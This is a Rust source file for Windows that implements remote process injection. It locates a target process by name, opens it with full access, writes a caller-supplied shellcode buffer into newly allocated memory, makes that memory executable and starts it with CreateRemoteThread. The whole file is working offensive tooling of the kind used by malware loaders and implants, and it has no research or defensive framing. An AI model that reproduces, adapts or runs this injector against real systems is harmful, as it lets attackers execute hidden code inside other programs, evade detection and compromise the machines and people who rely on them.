use std::{error::Error, fmt::Display, mem::transmute};

mod err;

use err::*;
use windows::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::{
            Debug::*,
            ToolHelp::{
                CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
                TH32CS_SNAPPROCESS,
            },
        },
        Memory::*,
        Threading::*,
    },
};

pub struct ProcessId(pub u32);

pub struct Payload<'a> {
    shellcode: &'a [u8],
    len: usize,
}

impl<'a> From<&'a [u8]> for Payload<'a> {
    fn from(shellcode: &'a [u8]) -> Self {
        Self {
            shellcode,
            len: shellcode.len(),
        }
    }
}

pub fn find_process(name: &str) -> Result<ProcessId, FindProcessError> {
    unsafe {
        let Ok(snapshot_handle) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) else {
            return Err(FindProcessError::SnapshotError);
        };

        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        let Ok(_) = Process32First(snapshot_handle, &mut entry) else {
            let _ = CloseHandle(snapshot_handle);
            return Err(FindProcessError::NotFound);
        };

        loop {
            let Ok(_) = Process32Next(snapshot_handle, &mut entry) else {
                let _ = CloseHandle(snapshot_handle);
                return Err(FindProcessError::NotFound);
            };

            let Ok(process_name) = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr()).to_str()
            else {
                continue;
            };

            if process_name == name {
                let _ = CloseHandle(snapshot_handle);
                return Ok(ProcessId(entry.th32ProcessID));
            }
        }
    }
}

pub fn inject(pid: ProcessId, payload: Payload) -> Result<(), InjectionError> {
    unsafe {
        let Ok(process_handle) = OpenProcess(PROCESS_ALL_ACCESS, false, pid.0) else {
            return Err(InjectionError::OpenProcessError);
        };

        let memory_ptr = VirtualAllocEx(
            process_handle,
            None,
            payload.len,
            MEM_COMMIT,
            PAGE_READWRITE,
        );

        if memory_ptr.is_null() {
            let _ = CloseHandle(process_handle);
            return Err(InjectionError::AllocateMemoryError);
        }

        let Ok(_) = WriteProcessMemory(
            process_handle,
            memory_ptr,
            payload.shellcode.as_ptr() as *const std::ffi::c_void,
            payload.len,
            None,
        ) else {
            let _ = CloseHandle(process_handle);
            return Err(InjectionError::WriteProcessMemoryError);
        };

        let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS::default();
        let Ok(_) = VirtualProtectEx(
            process_handle,
            memory_ptr,
            payload.len,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) else {
            let _ = CloseHandle(process_handle);
            return Err(InjectionError::VirtualProtectProcessMemoryError);
        };

        let Ok(thread_handle) = CreateRemoteThread(
            process_handle,
            None,
            0,
            transmute(memory_ptr),
            None,
            0,
            None,
        ) else {
            let _ = CloseHandle(process_handle);
            return Err(InjectionError::CreateRemoteThreadError);
        };

        let _ = CloseHandle(process_handle);
        let _ = CloseHandle(thread_handle);

        Ok(())
    }
}
